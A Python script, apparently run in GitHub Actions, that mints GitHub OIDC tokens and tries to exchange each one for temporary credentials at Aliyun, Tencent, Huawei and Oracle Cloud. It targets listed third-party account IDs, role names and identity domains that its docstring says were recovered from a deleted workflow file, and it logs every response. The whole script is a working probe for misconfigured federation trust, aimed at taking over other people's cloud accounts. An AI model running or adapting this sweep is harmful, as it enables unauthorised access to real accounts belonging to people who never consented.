#!/usr/bin/env python3
"""prl-t1 i4825: GitHub-OIDC non-Big-3 federation sweep.
One mint per distinct audience, exactly ONE exchange per target, exact error body recorded.
Targets recovered verbatim from the deleted c211-i119945-nonbig3.yml (voice-bot 0a3621c).
AWS role set already tested in i4168 run 45629362934 (all InvalidIdentityToken; openvdb 403)."""
import json, os, time, random, urllib.request, urllib.error, urllib.parse, base64, socket

socket.setdefaulttimeout(40)
base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')


def mint(aud):
    if not base or not tok:
        raise RuntimeError('oidc env missing')
    url = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok,
                                               'Accept': 'application/json',
                                               'User-Agent': 'prl-t1'})
    return json.loads(urllib.request.urlopen(req, timeout=30).read())['value']


def claims(jwt):
    p = jwt.split('.')[1]
    p += '=' * (-len(p) % 4)
    d = json.loads(base64.urlsafe_b64decode(p))
    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'ref')}


def post(url, data, headers=None):
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        hdrs = headers or {'Content-Type': 'application/x-www-form-urlencoded'}
    else:
        body = data
        hdrs = headers or {'Content-Type': 'application/json'}
    req = urllib.request.Request(url, data=body, headers=hdrs)
    try:
        r = urllib.request.urlopen(req, timeout=40)
        return r.status, r.read().decode('utf-8', 'replace')[:900]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')[:900]
    except Exception as e:
        return -1, str(e)[:250]


out = {}

# --- Aliyun: one token, audience sts.aliyuncs.com ---
try:
    ja = mint('sts.aliyuncs.com')
    out['mint_ali'] = claims(ja)
except Exception as e:
    ja = None
    out['mint_ali_err'] = str(e)[:200]
if ja:
    ali = [('1083406401917880', 'gh-oidc-mcpywrap-site-deploy'),
           ('1145786521954482', 'teable-cn-test-github-deploy'),
           ('1238311235538497', 'github-actions-deploy-role'),
           ('1354810585726671', 'docker-registry'),
           ('1632903580111839', 'github-actions'),
           ('5621254376179407', 'docker'),
           ('1031059086324334', 'baby-diary-fc-deploy')]
    for acct, role in ali:
        st, b = post('https://sts.aliyuncs.com/', {
            'Action': 'AssumeRoleWithOIDC', 'Version': '2015-04-01',
            'OIDCProviderArn': 'acs:ram::%s:oidc-provider/github-actions' % acct,
            'RoleArn': 'acs:ram::%s:role/%s' % (acct, role),
            'OIDCToken': ja, 'DurationSeconds': '3600',
            'Timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'Format': 'JSON'})
        out['ali::%s::%s' % (acct, role)] = {'http': st, 'body': b}

# --- Tencent: audience sts.tencentcloudapi.com ---
try:
    jt = mint('sts.tencentcloudapi.com')
    out['mint_tc'] = claims(jt)
except Exception as e:
    jt = None
    out['mint_tc_err'] = str(e)[:200]
if jt:
    for u, rn in [('100021031865', 'demox-ci-deploy'),
                  ('100052992193', 'demox-ci-deploy'),
                  ('100022600923', 'KsamintVaultStsRole')]:
        st, b = post('https://sts.tencentcloudapi.com/', {
            'Action': 'AssumeRoleWithWebIdentity', 'Version': '2018-08-13',
            'ProviderId': 'github', 'WebIdentityToken': jt,
            'RoleArn': 'qcs::cam::uin/%s:roleName/%s' % (u, rn),
            'RoleSessionName': 'prl-i4825-t1',
            'Timestamp': int(time.time()), 'Nonce': random.randint(100000, 999999)},
            {'Content-Type': 'application/x-www-form-urlencoded',
             'X-TC-Action': 'AssumeRoleWithWebIdentity',
             'X-TC-Version': '2018-08-13', 'X-TC-Region': ''})
        out['tc::%s::%s' % (u, rn)] = {'http': st, 'body': b}

# --- Huawei: audience sts.huaweicloud.com, provider github_com ---
try:
    jh = mint('sts.huaweicloud.com')
    out['mint_hw'] = claims(jh)
except Exception as e:
    jh = None
    out['mint_hw_err'] = str(e)[:200]
if jh:
    for host in ['iam.myhuaweicloud.com',
                 'iam.ap-southeast-1.myhuaweicloud.com',
                 'iam.cn-north-4.myhuaweicloud.com']:
        body = json.dumps({'auth': {'id_token': {'id': jh,
                                                 'method': 'openid connect',
                                                 'provider': 'github_com'}}}).encode()
        st, b = post('https://%s/v3.0/OS-AUTH/id-token/tokens' % host, body,
                     {'Content-Type': 'application/json;charset=utf8'})
        out['hw::' + host] = {'http': st, 'body': b}

# --- OCI: audience 'oci', resource-principal-session-token exchange ---
try:
    jo = mint('oci')
    out['mint_oci'] = claims(jo)
except Exception as e:
    jo = None
    out['mint_oci_err'] = str(e)[:200]
if jo:
    for dom, cid in [('idcs-2615d95acce94592a217756c7d2f8c48', 'b15094b8f4204b76a7a834f189221284'),
                     ('idcs-8dd307747946491cbfe1b7a3f063db0d', '8aa264f421d646e98699b716b2e9b72e')]:
        data = {'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                'requested_token_type': 'urn:oci:token-type:resource-principal-session-token',
                'subject_token': jo,
                'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt',
                'audience': 'https://%s.identity.oraclecloud.com' % dom,
                'client_id': cid}
        st, b = post('https://%s.identity.oraclecloud.com/oauth2/v1/token' % dom, data)
        out['oci::' + dom] = {'http': st, 'body': b}

print('C211_I119945_RESULT=' + json.dumps(out), flush=True)
